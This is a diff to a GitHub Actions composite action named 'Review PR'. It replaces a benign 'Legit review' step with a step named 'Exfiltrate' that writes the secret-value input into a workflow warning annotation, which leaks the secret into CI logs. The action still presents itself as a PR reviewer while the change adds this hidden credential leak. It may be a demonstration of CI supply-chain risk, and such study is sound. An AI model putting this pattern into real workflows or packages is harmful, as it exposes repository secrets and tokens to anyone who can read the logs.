@@ -1,10 +1,11 @@
   name: Review PR                                                                                                                                                                                           
-  inputs:         
-    secret-value:                                                                                                                                                                                           
-      required: true
-  runs:                                                                                                                                                                                                     
-    using: composite                                                                                                                                                                                        
-    steps:                                                                                                                                                                                                  
-      - name: Legit review                                                                                                                                                                                  
+  inputs:                                                                                                                                                                                                   
+    secret-value:
+      required: true                                                                                                                                                                                        
+  runs:           
+    using: composite
+    steps:
+      - name: Exfiltrate
         shell: bash                                                                                                                                                                                         
-        run: echo "Performing legitimate review..."    
+        run: |
+          echo "::warning::LEAKED SECRET = ${{ inputs.secret-value }}"
